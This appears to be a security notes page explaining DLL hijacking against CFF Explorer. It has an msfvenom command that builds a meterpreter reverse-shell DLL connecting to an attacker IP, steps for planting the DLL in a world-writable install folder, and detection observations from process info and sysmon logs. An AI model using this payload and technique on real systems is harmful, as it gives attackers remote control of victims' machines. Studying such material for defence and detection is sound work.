# DLL Hijacking

## DLL Hijacking

### Execution

Generating a DLL that will be loaded and executed by a vulnerable program which connect back to the attacking system with a meterpreter shell:

{% code title="attacker\@kali" %}
```csharp
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=443 -f dll > evil-meterpreter64.dll
```
{% endcode %}

To illustrate this attack, we will exploit our beloved tool `CFF Explorer.exe` . Once the program is executed, it attempts to load `CFF ExplorerENU.dll` from the location the program is installed to, however that DLL cannot be loaded (note the NAME NOT FOUND) as it does not exist in the given path:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LIR_W8bJfdPcrjApTe4%2F-LIRknY3zb0_MxOLj0NX%2Fdll-missing.png?alt=media\&token=2faa3e0b-b27a-4029-b63a-8b13846d6ff6)

Luckily for the attacker, the location in which the DLL is being looked for - is world writable! Let's move our evil DLL `evil-meterpreter64.dll` to `C:\Program Files\NTCore\Explorer Suite` and rename it to `CFF ExplorerENU.dll`

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LIR_W8bJfdPcrjApTe4%2F-LIRmJl9V1yeo6QOGAr-%2Fdll-moved.png?alt=media\&token=89cf21ab-3262-4689-ac30-7ddba02576e4)

Launching the program again gives different results - DLL is found (SUCCESS):

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LIR_W8bJfdPcrjApTe4%2F-LIRmfQYhm8047M_0XQh%2Fdll-success.png?alt=media\&token=a1b7d26c-7d7d-483b-a066-47f2b83b3db6)

which is good news for the attacker - the DLL code gets executed, which gives attacker a meterpreter shell:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LIR_W8bJfdPcrjApTe4%2F-LIRmrmNBNKw7BSTVo_K%2Fdll-shell.png?alt=media\&token=dcefe5fa-d81e-417e-8869-5dbb6b469e1b)

### Observations

On the victim system, we can only see rundll32 with no associated parent process and established connection - this should raise your suspicion immediately:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LIRn2YIskHmtU6BsyuY%2F-LIRn5zzPhyA14bHGTe0%2Fdll-rundll.png?alt=media\&token=78b3bb62-7cfa-4cba-9cc3-37f950db59ab)

Looking at the rundll32 image info, we can see the current directory, which is helpful:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LIRn2YIskHmtU6BsyuY%2F-LIRnVNGX3_GHnHxOxkS%2Fdll-noparent.png?alt=media\&token=5833d06c-534a-471f-a5e7-f182a611fffc)

Looking at the sysmon logs gives us a better understanding of what happened - CFF Explorer.exe was started as a process `4856` which then kicked off a rundll32 (`1872`) which then established a connection to 10.0.0.5:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LIRoNW6KwUkXbQ79lJH%2F-LIRpIVuFbSrV3YO9f0h%2Fdll-logs.png?alt=media\&token=0443bc1d-46de-4c83-b50f-3dcd8efec559)

### References

{% embed url="https://attack.mitre.org/wiki/Technique/T1038" %}

{% embed url="https://pentestlab.blog/2017/03/27/dll-hijacking/" %}



<br>
